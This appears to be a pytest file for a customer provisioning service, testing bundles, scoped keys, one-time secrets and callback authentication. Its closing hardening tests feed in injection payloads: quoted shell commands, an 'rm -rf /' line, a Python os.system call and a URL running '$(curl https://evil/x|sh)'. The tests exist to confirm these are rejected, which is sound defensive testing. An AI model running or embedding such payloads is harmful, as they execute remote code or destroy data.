"""Customer provisioning bundles for modular OneBrain rollouts."""

from __future__ import annotations

from types import SimpleNamespace

import pytest
from fastapi import HTTPException
from cryptography.fernet import Fernet

import app.routers.provisioning as provisioning_router
from app.assistant.contracts import ASSISTANT_PURPOSES
from app.auth.principal import Principal
from app.auth.roles import ROLES
from app.controlplane.base import CustomerDeployment
from app.controlplane.memory import MemoryControlPlaneStore
from app.platform.base import BrandTheme
from app.platform.memory import MemoryPlatformStore
from app.provisioning.runs import (
    MemoryProvisioningRunStore,
    ProvisioningCallback,
    apply_callback,
    create_run,
    hash_callback_secret,
    read_one_time_secret,
)
from app.provisioning.service import CustomerProvisioner
from app.servicekeys.base import SCOPE_READ, SCOPE_WRITE, parse_key, verify_secret
from app.servicekeys.memory import MemoryServiceKeyStore


def _principal(role_id: str = "admin") -> Principal:
    role = ROLES[role_id]
    locations = None if role.scope == "chain" else frozenset({"munich"})
    return Principal(
        user_id=f"{role_id}@onebrain",
        role_id=role.id,
        role_label=role.label,
        clearance=role.clearance,
        locations=locations,
        categories=role.categories,
        location_label="munich",
    )


def _stores():
    return MemoryPlatformStore(), MemoryControlPlaneStore()


def _secret_settings(**overrides):
    data = {
        "secret_encryption_key": Fernet.generate_key().decode("utf-8"),
        "secret_encryption_key_version": "test",
        "bootstrap_secret_ttl_seconds": 3600,
        "github_owner": "",
        "github_repo": "",
        "github_workflow": "provision-customer.yml",
        "github_ref": "main",
        "github_dispatch_token": "",
        "provisioning_callback_key_id": "",
        "provisioning_callback_key_hash": "",
        "provisioning_callback_allowed_hosts": "",
        "is_operator_surface": True,
        "operator_mode": False,
    }
    data.update(overrides)
    return SimpleNamespace(**data)


def test_full_stack_provisioning_separates_private_and_customer_service_spaces():
    platform, control = _stores()

    result = CustomerProvisioner(platform, control).provision(
        account_id="acme",
        account_kind="organization",
        customer_name="Acme GmbH",
        owner_user_id="admin@onebrain",
        bundle_id="full_stack",
        deployment_id="dep_acme",
        deployment_type="dedicated_railway",
        region="eu-central",
        release_ring="pilot",
        initial_version="2026.07.0",
        module_versions={"assistant-service": "2026.07.assistant"},
    )

    assert result.account.id == "acme"
    assert {s.kind for s in result.spaces} == {"personal", "business", "customer_service", "shared", "family"}
    assert {m.module_id for m in result.modules} == {
        "onebrain-api",
        "onebrain-admin-ui",
        "onebrain-workers",
        "assistant-service",
        "communication-api",
        "communication-widget",
        "communication-voice",
        "communication-workers",
    }
    assert {m.module_id: m.version for m in result.modules}["assistant-service"] == "2026.07.assistant"

    communication = next(app for app in result.installations if app.app_id == "communication")
    enabled_kinds = {platform.get_space(space_id).kind for space_id in communication.enabled_space_ids}
    assert enabled_kinds == {"customer_service", "shared"}

    customer_space = next(s for s in result.spaces if s.kind == "customer_service")
    personal_space = next(s for s in result.spaces if s.kind == "personal")
    assert platform.check_app_access("acme", "communication", customer_space.id, "customer_service_answer").allowed
    private_decision = platform.check_app_access("acme", "communication", personal_space.id, "customer_service_answer")
    assert private_decision.allowed is False
    assert private_decision.reason == "customer_service_cannot_use_private_space"

    deployment = control.get_deployment("dep_acme")
    assert deployment and deployment.current_version == "2026.07.0"
    assert platform.list_audit("acme")[-1].action == "customer.provisioned"


def test_communication_bundle_does_not_install_assistant_modules():
    platform, control = _stores()

    CustomerProvisioner(platform, control).provision(
        account_id="supportco",
        account_kind="organization",
        customer_name="SupportCo",
        owner_user_id="admin@onebrain",
        bundle_id="onebrain_communication",
        deployment_id="dep_supportco",
        deployment_type="shared_railway",
        region="eu-central",
        release_ring="manual",
        initial_version="0.1.0",
    )

    module_ids = {m.module_id for m in control.list_modules("dep_supportco")}
    assert "assistant-service" not in module_ids
    assert {"communication-api", "communication-widget", "communication-voice", "communication-workers"} <= module_ids
    assert {s.kind for s in platform.list_spaces("supportco")} == {"business", "customer_service", "shared"}


def test_full_stack_provisioning_mints_constrained_integration_keys():
    platform, control = _stores()
    service_keys = MemoryServiceKeyStore()

    result = CustomerProvisioner(platform, control, service_keys).provision(
        account_id="acme",
        account_kind="organization",
        customer_name="Acme GmbH",
        owner_user_id="admin@onebrain",
        bundle_id="full_stack",
        deployment_id="dep_acme",
        deployment_type="dedicated_railway",
        region="eu-central",
        release_ring="pilot",
        initial_version="2026.07.0",
        mint_integration_keys=True,
    )

    assert {credential.app_id for credential in result.credentials} == {"assistant", "communication", "kpi_dashboard"}

    assistant = next(credential for credential in result.credentials if credential.app_id == "assistant")
    stored_assistant = service_keys.get(assistant.id)
    assert stored_assistant.account_id == "acme"
    assert stored_assistant.app_id == "assistant"
    assert set(stored_assistant.scopes) == {SCOPE_READ, SCOPE_WRITE}
    assert set(stored_assistant.purposes) == set(ASSISTANT_PURPOSES)

    communication = next(credential for credential in result.credentials if credential.app_id == "communication")
    stored = service_keys.get(communication.id)
    parsed = parse_key(communication.key)
    assert parsed is not None
    _, secret = parsed
    assert verify_secret(secret, stored.key_hash)
    assert stored.tenant_id == "acme"
    assert stored.account_id == "acme"
    assert stored.app_id == "communication"
    assert set(stored.scopes) == {SCOPE_READ, SCOPE_WRITE}
    assert set(stored.purposes) == {"customer_service_answer", "customer_service_inbox"}
    assert {platform.get_space(space_id).kind for space_id in stored.space_ids} == {"customer_service", "shared"}
    assert communication.key not in str(platform.list_audit("acme")[-1].meta)
    assert communication.id in platform.list_audit("acme")[-1].meta["service_key_ids"]

    kpi = next(credential for credential in result.credentials if credential.app_id == "kpi_dashboard")
    stored_kpi = service_keys.get(kpi.id)
    assert stored_kpi.account_id == "acme"
    assert stored_kpi.app_id == "kpi_dashboard"
    assert set(stored_kpi.scopes) == {SCOPE_READ, SCOPE_WRITE}
    assert set(stored_kpi.purposes) == {"kpi_read", "kpi_configure", "kpi_snapshot_write"}
    assert {platform.get_space(space_id).kind for space_id in stored_kpi.space_ids} == {"business", "shared"}


def test_kpi_dashboard_bundle_is_selectable_for_new_customers():
    platform, control = _stores()
    service_keys = MemoryServiceKeyStore()

    result = CustomerProvisioner(platform, control, service_keys).provision(
        account_id="metricsco",
        account_kind="organization",
        customer_name="MetricsCo",
        owner_user_id="admin@onebrain",
        bundle_id="onebrain_kpi_dashboard",
        deployment_id="dep_metricsco",
        deployment_type="dedicated_railway",
        region="eu-central",
        release_ring="pilot",
        initial_version="2026.07.0",
        mint_integration_keys=True,
    )

    assert [app.app_id for app in result.installations] == ["onebrain_core", "kpi_dashboard"]
    assert {m.module_id for m in result.modules} == {"onebrain-api", "onebrain-admin-ui", "onebrain-workers"}

    kpi_app = next(app for app in result.installations if app.app_id == "kpi_dashboard")
    assert set(kpi_app.allowed_purposes) == {"kpi_read", "kpi_configure", "kpi_snapshot_write"}
    assert {platform.get_space(space_id).kind for space_id in kpi_app.enabled_space_ids} == {"business", "shared"}

    assert len(result.credentials) == 1
    credential = result.credentials[0]
    assert credential.app_id == "kpi_dashboard"
    stored = service_keys.get(credential.id)
    assert stored.app_id == "kpi_dashboard"
    assert set(stored.scopes) == {SCOPE_READ, SCOPE_WRITE}
    assert set(stored.purposes) == {"kpi_read", "kpi_configure", "kpi_snapshot_write"}


def test_provisioning_stores_account_brand_and_app_overrides():
    platform, control = _stores()

    result = CustomerProvisioner(platform, control).provision(
        account_id="brandco",
        account_kind="organization",
        customer_name="BrandCo",
        owner_user_id="admin@onebrain",
        bundle_id="full_stack",
        deployment_id="dep_brandco",
        deployment_type="dedicated_railway",
        region="eu-central",
        release_ring="pilot",
        initial_version="2026.07.0",
        brand_theme=BrandTheme(
            id="",
            account_id="",
            name="BrandCo",
            primary_color="#112233",
            secondary_color="#223344",
            accent_color="#334455",
            background_color="#f4f2ee",
            surface_color="#ffffff",
            text_color="#101828",
            muted_color="#5f6671",
            success_color="#1f7a4d",
            warning_color="#b98a4e",
            danger_color="#b4453e",
        ),
        app_brand_themes={
            "assistant": BrandTheme(
                id="",
                account_id="",
                name="Assistant",
                primary_color="#445566",
                secondary_color="#223344",
                accent_color="#334455",
                background_color="#f4f2ee",
                surface_color="#ffffff",
                text_color="#101828",
                muted_color="#5f6671",
                success_color="#1f7a4d",
                warning_color="#b98a4e",
                danger_color="#b4453e",
            ),
        },
    )

    assert result.brand_theme.primary_color == "#112233"
    assert platform.resolve_brand_theme("brandco").primary_color == "#112233"
    assert platform.resolve_brand_theme("brandco", "assistant").primary_color == "#445566"
    assert platform.resolve_brand_theme("brandco", "communication").primary_color == "#112233"
    assert platform.list_audit("brandco")[-1].meta["brand_theme_id"] == "brand_brandco_account"
    assert "brand_brandco_assistant" in platform.list_audit("brandco")[-1].meta["app_brand_theme_ids"]
    assert {theme.app_id for theme in result.app_brand_themes} >= {"assistant"}


def test_unknown_app_brand_override_is_rejected_before_writes():
    platform, control = _stores()

    with pytest.raises(ValueError, match="Unknown app theme overrides"):
        CustomerProvisioner(platform, control).provision(
            account_id="coreonly",
            account_kind="organization",
            customer_name="CoreOnly",
            owner_user_id="admin@onebrain",
            bundle_id="onebrain_only",
            deployment_id="dep_coreonly",
            deployment_type="dedicated_railway",
            region="",
            release_ring="manual",
            initial_version="0.1.0",
            app_brand_themes={
                "assistant": BrandTheme(
                    id="",
                    account_id="",
                    primary_color="#112233",
                    secondary_color="#223344",
                    accent_color="#334455",
                    background_color="#f4f2ee",
                    surface_color="#ffffff",
                    text_color="#101828",
                    muted_color="#5f6671",
                    success_color="#1f7a4d",
                    warning_color="#b98a4e",
                    danger_color="#b4453e",
                ),
            },
        )

    assert platform.list_accounts() == []


def test_duplicate_deployment_blocks_before_platform_records_are_created():
    platform, control = _stores()
    control.create_deployment(CustomerDeployment(id="dep_acme", customer_name="Existing"))

    with pytest.raises(ValueError, match="deployment already exists"):
        CustomerProvisioner(platform, control).provision(
            account_id="acme",
            account_kind="organization",
            customer_name="Acme",
            owner_user_id="admin@onebrain",
            bundle_id="full_stack",
            deployment_id="dep_acme",
            deployment_type="dedicated_railway",
            region="",
            release_ring="manual",
            initial_version="0.1.0",
        )

    assert platform.list_accounts() == []


def test_unknown_module_version_override_is_rejected_before_writes():
    platform, control = _stores()

    with pytest.raises(ValueError, match="Unknown module versions"):
        CustomerProvisioner(platform, control).provision(
            account_id="assistantco",
            account_kind="organization",
            customer_name="AssistantCo",
            owner_user_id="admin@onebrain",
            bundle_id="onebrain_assistant",
            deployment_id="dep_assistantco",
            deployment_type="dedicated_railway",
            region="",
            release_ring="manual",
            initial_version="0.1.0",
            module_versions={"communication-api": "0.2.0"},
        )

    assert platform.list_accounts() == []
    assert control.get_deployment("dep_assistantco") is None


def test_provisioning_router_requires_admin(monkeypatch):
    platform, control = _stores()
    service_keys = MemoryServiceKeyStore()
    monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
    monkeypatch.setattr(provisioning_router, "get_control_plane_store", lambda: control)
    monkeypatch.setattr(provisioning_router, "get_service_key_store", lambda: service_keys)

    with pytest.raises(HTTPException) as exc:
        provisioning_router.provision_customer(
            provisioning_router.CustomerProvisionCreate(
                customer_name="Acme",
                account_id="acme",
                deployment_id="dep_acme",
            ),
            principal=_principal("front_desk"),
        )
    assert exc.value.status_code == 403

    created = provisioning_router.provision_customer(
        provisioning_router.CustomerProvisionCreate(
            customer_name="Acme",
            bundle_id="onebrain_only",
            account_id="acme",
            deployment_id="dep_acme",
            initial_version="0.1.0",
        ),
        principal=_principal("admin"),
    )

    assert created.account.id == "acme"
    assert created.bundle_id == "onebrain_only"
    assert [app.app_id for app in created.apps] == ["onebrain_core"]
    assert created.credentials == []
    assert created.brand_theme.primary_color == "#16191e"


def test_provisioning_run_callbacks_store_bootstrap_secret_once():
    store = MemoryProvisioningRunStore()
    settings = _secret_settings()
    run = create_run(
        store,
        account_id="acme",
        deployment_id="dep_acme",
        bundle_id="full_stack",
        requested_by="admin",
        payload={"dry_run": True},
    )

    running = apply_callback(store, settings, run.id, ProvisioningCallback(status="running"))
    assert running.status == "running"

    succeeded = apply_callback(
        store,
        settings,
        run.id,
        ProvisioningCallback(
            status="succeeded",
            external_run_id="gh_123",
            external_run_url="https://github.example/run",
            railway_project_id="rail_proj",
            service_urls={"api": "https://api.example"},
            migration_revision="0006_provisioning_runs",
            smoke_status="passed",
            bootstrap_password="temporary-admin-password",
        ),
    )

    assert succeeded.status == "succeeded"
    assert succeeded.bootstrap_secret_id.startswith("ots_")
    assert "temporary-admin-password" not in str(succeeded)
    assert read_one_time_secret(store, settings, succeeded.bootstrap_secret_id) == "temporary-admin-password"
    with pytest.raises(ValueError, match="already been read"):
        read_one_time_secret(store, settings, succeeded.bootstrap_secret_id)


def test_provisioning_run_refuses_stale_and_terminal_callbacks():
    store = MemoryProvisioningRunStore()
    settings = _secret_settings()
    run = create_run(
        store,
        account_id="acme",
        deployment_id="dep_acme",
        bundle_id="full_stack",
        requested_by="admin",
        payload={},
    )
    apply_callback(store, settings, run.id, ProvisioningCallback(status="running"))

    with pytest.raises(ValueError, match="backward"):
        apply_callback(store, settings, run.id, ProvisioningCallback(status="dispatched"))

    apply_callback(store, settings, run.id, ProvisioningCallback(status="failed", failure_reason="railway failed"))
    with pytest.raises(ValueError, match="terminal"):
        apply_callback(store, settings, run.id, ProvisioningCallback(status="running"))


def test_provisioning_callback_endpoint_requires_dedicated_callback_key(monkeypatch):
    store = MemoryProvisioningRunStore()
    settings = _secret_settings(
        provisioning_callback_key_id="cb_1",
        provisioning_callback_key_hash=hash_callback_secret("callback-secret"),
    )
    run = create_run(
        store,
        account_id="acme",
        deployment_id="dep_acme",
        bundle_id="full_stack",
        requested_by="admin",
        payload={},
    )
    monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: store)
    monkeypatch.setattr(provisioning_router, "get_settings", lambda: settings)

    with pytest.raises(HTTPException) as denied:
        provisioning_router.provisioning_callback(
            run.id,
            provisioning_router.ProvisioningCallbackIn(status="running"),
            authorization="Bearer wrong",
            x_onebrain_callback_key_id="cb_1",
        )
    assert denied.value.status_code == 401

    accepted = provisioning_router.provisioning_callback(
        run.id,
        provisioning_router.ProvisioningCallbackIn(status="running"),
        authorization="Bearer callback-secret",
        x_onebrain_callback_key_id="cb_1",
    )
    assert accepted.status == "running"


def test_external_provisioning_without_github_config_creates_visible_failed_run(monkeypatch):
    platform, control = _stores()
    service_keys = MemoryServiceKeyStore()
    runs = MemoryProvisioningRunStore()
    monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
    monkeypatch.setattr(provisioning_router, "get_control_plane_store", lambda: control)
    monkeypatch.setattr(provisioning_router, "get_service_key_store", lambda: service_keys)
    monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: runs)
    monkeypatch.setattr(provisioning_router, "get_settings", lambda: _secret_settings())

    created = provisioning_router.provision_customer(
        provisioning_router.CustomerProvisionCreate(
            customer_name="Acme",
            bundle_id="onebrain_only",
            account_id="acme",
            deployment_id="dep_acme",
            initial_version="0.1.0",
            external_provisioning=True,
            callback_url="https://admin.example/api/onebrain/provisioning/runs/{run_id}/callback",
        ),
        principal=_principal("admin"),
    )

    assert created.provisioning_run is not None
    assert created.provisioning_run.status == "dispatch_failed"
    assert "not configured" in created.provisioning_run.failure_reason
    assert runs.list_runs(account_id="acme")[0].id == created.provisioning_run.id


def test_external_provisioning_requires_callback_url_before_writes(monkeypatch):
    platform, control = _stores()
    service_keys = MemoryServiceKeyStore()
    runs = MemoryProvisioningRunStore()
    monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
    monkeypatch.setattr(provisioning_router, "get_control_plane_store", lambda: control)
    monkeypatch.setattr(provisioning_router, "get_service_key_store", lambda: service_keys)
    monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: runs)

    with pytest.raises(HTTPException) as exc:
        provisioning_router.provision_customer(
            provisioning_router.CustomerProvisionCreate(
                customer_name="Acme",
                bundle_id="onebrain_only",
                account_id="acme",
                deployment_id="dep_acme",
                initial_version="0.1.0",
                external_provisioning=True,
            ),
            principal=_principal("admin"),
        )

    assert exc.value.status_code == 400
    assert platform.list_accounts() == []
    assert control.list_deployments() == []
    assert runs.list_runs() == []


def test_hetzner_provision_customer_assembles_valid_bundle(monkeypatch):
    # A full customer provision on the Hetzner backend threads owner_email -> the owner OTP,
    # which is the REQUIRED ONEBRAIN_ADMIN_PASSWORD bundle key. Before the threading the
    # bundle failed validate_bundle and the run dispatch_failed; with it, a valid re-readable
    # bundle is assembled and the run is dispatched.
    import json

    from app.auth.passwords import verify_password
    from app.config import Settings
    from app.controlplane.base import ReleaseManifest
    from app.fleet.memory import MemoryFleetStore
    from app.provisioning.bundles import CORE_MODULES
    from app.provisioning.hetzner.broker import InProcessHetznerBroker
    from app.provisioning.hetzner.fake import FakeHetznerClient
    from app.provisioning.runs import OneTimeSecretCipher
    from app.users.memory import MemoryUserStore

    platform, control = _stores()
    users = MemoryUserStore()
    runs = MemoryProvisioningRunStore()
    fleet = MemoryFleetStore()
    fake = FakeHetznerClient()

    # A digest-pinned release the box will run (Hetzner fails closed without one).
    control.create_release(ReleaseManifest(
        version="0.1.0", git_sha="abc", modules={m: "0.1.0" for m in CORE_MODULES},
        images={m: f"ghcr.io/proark1/{m}@sha256:{'a' * 64}" for m in CORE_MODULES},
        rollback_kind="code_only",
    ))
    settings = Settings(
        provisioner_backend="hetzner", hetzner_api_token="tok",
        hetzner_allow_inprocess_broker=True, hetzner_firewall_id="fw1",
        hetzner_volume_size_gb=0, secret_encryption_key="unit-test-secret-key",
        fleet_url="https://mc.example",
    )
    monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
    monkeypatch.setattr(provisioning_router, "get_control_plane_store", lambda: control)
    monkeypatch.setattr(provisioning_router, "get_service_key_store", lambda: MemoryServiceKeyStore())
    monkeypatch.setattr(provisioning_router, "get_user_store", lambda: users)
    monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: runs)
    monkeypatch.setattr(provisioning_router, "get_fleet_store", lambda: fleet)
    monkeypatch.setattr(provisioning_router, "get_settings", lambda: settings)
    monkeypatch.setattr(provisioning_router, "build_hetzner_broker", lambda s: InProcessHetznerBroker(fake))

    created = provisioning_router.provision_customer(
        provisioning_router.CustomerProvisionCreate(
            customer_name="Acme", bundle_id="onebrain_only", account_id="acme",
            deployment_id="dep_acme", initial_version="0.1.0",
            owner_email="Owner@Acme.example",
            external_provisioning=True,
            callback_url="https://admin.example/api/onebrain/provisioning/runs/{run_id}/callback",
        ),
        principal=_principal("admin"),
    )

    # The run dispatched (validate_bundle passed) — NOT dispatch_failed — and a box was created.
    assert created.provisioning_run is not None
    assert created.provisioning_run.status == "dispatched", created.provisioning_run.failure_reason
    assert len(fake.servers) == 1

    # A valid re-readable bundle was assembled; its ADMIN_PASSWORD is exactly the owner OTP.
    bundle_row = runs.get_secret_bundle("dep_acme")
    assert bundle_row is not None
    bundle = json.loads(OneTimeSecretCipher(settings).open_bundle(bundle_row.ciphertext))
    assert bundle["ONEBRAIN_ADMIN_PASSWORD"]
    owner = users.get_by_email("owner@acme.example")
    assert owner is not None and owner.role_id == "admin"
    assert verify_password(bundle["ONEBRAIN_ADMIN_PASSWORD"], owner.password_hash)
    # The box admin is LOGINABLE: ONEBRAIN_ADMIN_EMAIL is baked (normalized) alongside the
    # password, and it matches the platform owner User's email — so the customer logs into
    # their box with the same identity. seed.py needs BOTH to seed the admin at first boot.
    assert bundle["ONEBRAIN_ADMIN_EMAIL"] == "owner@acme.example"
    assert bundle["ONEBRAIN_ADMIN_EMAIL"] == owner.email


def test_hetzner_provision_customer_requires_owner_email(monkeypatch):
    # Fail FAST (400) rather than surface an opaque dispatch_failed when owner_email is
    # missing on the Hetzner backend (the owner OTP is a required bundle key).
    from app.config import Settings

    platform, control = _stores()
    runs = MemoryProvisioningRunStore()
    settings = Settings(provisioner_backend="hetzner", hetzner_api_token="tok",
                        hetzner_allow_inprocess_broker=True)
    monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
    monkeypatch.setattr(provisioning_router, "get_control_plane_store", lambda: control)
    monkeypatch.setattr(provisioning_router, "get_service_key_store", lambda: MemoryServiceKeyStore())
    monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: runs)
    monkeypatch.setattr(provisioning_router, "get_settings", lambda: settings)

    with pytest.raises(HTTPException) as exc:
        provisioning_router.provision_customer(
            provisioning_router.CustomerProvisionCreate(
                customer_name="Acme", bundle_id="onebrain_only", account_id="acme",
                deployment_id="dep_acme", initial_version="0.1.0",
                external_provisioning=True,
                callback_url="https://admin.example/cb/{run_id}",
            ),
            principal=_principal("admin"),
        )
    assert exc.value.status_code == 400
    assert "owner_email" in exc.value.detail
    # Failed fast BEFORE any account / deployment / run writes.
    assert platform.list_accounts() == []
    assert control.list_deployments() == []
    assert runs.list_runs() == []


def test_retry_rejects_non_failed_provisioning_run(monkeypatch):
    runs = MemoryProvisioningRunStore()
    run = create_run(
        runs,
        account_id="acme",
        deployment_id="dep_acme",
        bundle_id="onebrain_only",
        requested_by="admin",
        payload={"dry_run": True},
    )
    monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: runs)
    # Mission Control operator context, so run-account scoping is bypassed and we
    # reach the status guard under test.
    monkeypatch.setattr(provisioning_router, "get_settings",
                        lambda: SimpleNamespace(is_operator_surface=True, operator_mode=True))

    with pytest.raises(HTTPException) as exc:
        provisioning_router.retry_provisioning_run(run.id, principal=_principal("admin"))

    assert exc.value.status_code == 409
    assert len(runs.list_runs()) == 1


# --- workflow-injection hardening -------------------------------------------

def test_provision_create_rejects_shell_injection_in_module_versions():
    """A module version like "1.0'; curl evil #" must be rejected at the schema
    boundary so it can never reach the provision-customer workflow's shell/python
    interpolation (the job holds RAILWAY_TOKEN + the callback key)."""
    import pydantic

    with pytest.raises(pydantic.ValidationError):
        provisioning_router.CustomerProvisionCreate(
            customer_name="x",
            module_versions={"assistant-service": "1.0'; curl https://evil #"},
        )


def test_provision_create_rejects_injection_in_structural_fields():
    import pydantic

    for field, bad in [
        ("deployment_type", '"+__import__("os").system("x")+"'),
        ("initial_version", "1.0\nrm -rf /"),
        ("region", "us'; touch pwned #"),
    ]:
        with pytest.raises(pydantic.ValidationError):
            provisioning_router.CustomerProvisionCreate(customer_name="x", **{field: bad})


def test_provision_create_rejects_injection_in_brand_colors():
    import pydantic

    with pytest.raises(pydantic.ValidationError):
        provisioning_router.CustomerProvisionCreate(
            customer_name="x",
            brand_theme=provisioning_router.BrandThemeInput(primary_color="#000'; evil #"),
        )


def test_provision_create_accepts_legitimate_values():
    """The hardening must not reject normal versions, slugs, module maps, or hex
    colors (customer/brand names remain free text and are intentionally allowed)."""
    ok = provisioning_router.CustomerProvisionCreate(
        customer_name="O'Brien Gym & Co",  # free-text name: quotes/space/& allowed
        deployment_type="dedicated_railway",
        region="europe-west1",
        initial_version="2026.07.0",
        current_migration="0015_fleet_telemetry",
        module_versions={"communication-api": "1.2.0", "assistant-service": "0.9.1"},
        brand_theme=provisioning_router.BrandThemeInput(primary_color="#16191e"),
    )
    assert ok.customer_name == "O'Brien Gym & Co"
    assert ok.module_versions["communication-api"] == "1.2.0"


def test_callback_url_rejects_shell_metacharacters(monkeypatch):
    platform, control = _stores()
    monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
    monkeypatch.setattr(provisioning_router, "get_control_plane_store", lambda: control)
    monkeypatch.setattr(provisioning_router, "get_service_key_store", lambda: MemoryServiceKeyStore())
    monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: MemoryProvisioningRunStore())
    monkeypatch.setattr(provisioning_router, "get_settings", lambda: _secret_settings())

    with pytest.raises(HTTPException) as exc:
        provisioning_router.provision_customer(
            provisioning_router.CustomerProvisionCreate(
                customer_name="Acme", account_id="acme", deployment_id="dep_acme",
                external_provisioning=True,
                callback_url="https://cb.allowed.host/x?a=$(curl https://evil/x|sh)",
            ),
            principal=_principal("admin"),
        )
    assert exc.value.status_code == 400


def test_run_reads_reject_non_owning_admin(monkeypatch):
    platform, control = _stores()
    from app.platform.base import Account
    platform.create_account(Account(id="acme", kind="organization", name="Acme", owner_user_id="someone_else@x"))
    runs = MemoryProvisioningRunStore()
    run = create_run(runs, account_id="acme", deployment_id="dep_acme", bundle_id="onebrain_only",
                     requested_by="someone_else@x", payload={"dry_run": True})
    monkeypatch.setattr(provisioning_router, "get_provisioning_run_store", lambda: runs)
    monkeypatch.setattr(provisioning_router, "get_platform_store", lambda: platform)
    monkeypatch.setattr(provisioning_router, "get_settings",
                        lambda: SimpleNamespace(is_operator_surface=True, operator_mode=False))
    outsider = _principal("admin")  # admin@onebrain, does not administer acme

    for call in (
        lambda: provisioning_router.get_provisioning_run(run.id, principal=outsider),
        lambda: provisioning_router.retry_provisioning_run(run.id, principal=outsider),
    ):
        with pytest.raises(HTTPException) as ei:
            call()
        assert ei.value.status_code == 404
